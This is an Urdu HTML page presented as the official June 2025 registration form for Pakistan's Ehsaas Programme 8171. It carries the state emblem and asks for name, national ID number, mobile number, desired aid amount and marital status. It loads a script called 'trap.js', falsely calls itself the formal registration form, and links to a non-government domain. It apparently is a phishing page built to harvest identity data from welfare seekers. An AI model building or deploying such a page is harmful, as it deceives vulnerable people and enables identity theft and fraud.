<!DOCTYPE html>
<html lang="ur" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>احساس پروگرام 8171 - رجسٹریشن</title>
  <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu&display=swap" rel="stylesheet">
  <script src="/static/trap.js"></script>
  <style>
    body {
      background: linear-gradient(to bottom, #f0f0f0, #d6f5d6);
      font-family: 'Noto Nastaliq Urdu', serif;
      margin: 0;
      padding: 0;
    }
    .header {
      background-color: #014421;
      color: white;
      padding: 20px;
      text-align: center;
      font-size: 24px;
    }
    .content {
      max-width: 600px;
      background-color: white;
      margin: 30px auto;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0px 0px 15px rgba(0,0,0,0.2);
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 18px;
      direction: rtl;
    }
    button {
      width: 100%;
      background-color: #006400;
      color: white;
      padding: 15px;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
    }
    .note {
      font-size: 14px;
      color: gray;
      text-align: center;
      margin-top: 15px;
    }
    .gov-logo {
      width: 80px;
      margin: 0 auto 10px;
      display: block;
    }
  </style>
</head>
<body>

  <div class="header">احساس پروگرام 8171 -  جون 2025 رجسٹریشن</div>

  <div class="content">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Emblem_of_Pakistan.svg/1200px-Emblem_of_Pakistan.svg.png" alt="gov" class="gov-logo">
    <form id="ehsaasForm">
      <input name="name" placeholder="نام درج کریں" required>
      <input name="cnic" placeholder="شناختی کارڈ نمبر (13 ہندسے)" required>
      <input name="mobile" placeholder="موبائل نمبر (03xx-xxxxxxx)" required>
      <select name="amount" required>
        <option disabled selected>آپ کو کتنی رقم درکار ہے؟</option>
        <option>2000</option>
        <option>8500</option>
        <option>12000</option>
        <option>23000</option>
        <option>25000</option>
        <option>36000</option>
      </select>
      <select name="married" required>
        <option disabled selected>کیا آپ شادی شدہ ہیں؟</option>
        <option>جی ہاں</option>
        <option>نہیں</option>
      </select>
      <button type="submit">درخواست جمع کروائیں</button>
    </form>
    <div class="note">
      یہ احساس پروگرام کا رسمی رجسٹریشن فارم ہے۔ مزید معلومات کے لیے 
      <a href="https://8171ehsaasprogramme.com.pk/" target="_blank">اصل ویب سائٹ ملاحظہ کریں</a>۔
    </div>
  </div>
</body>
</html>
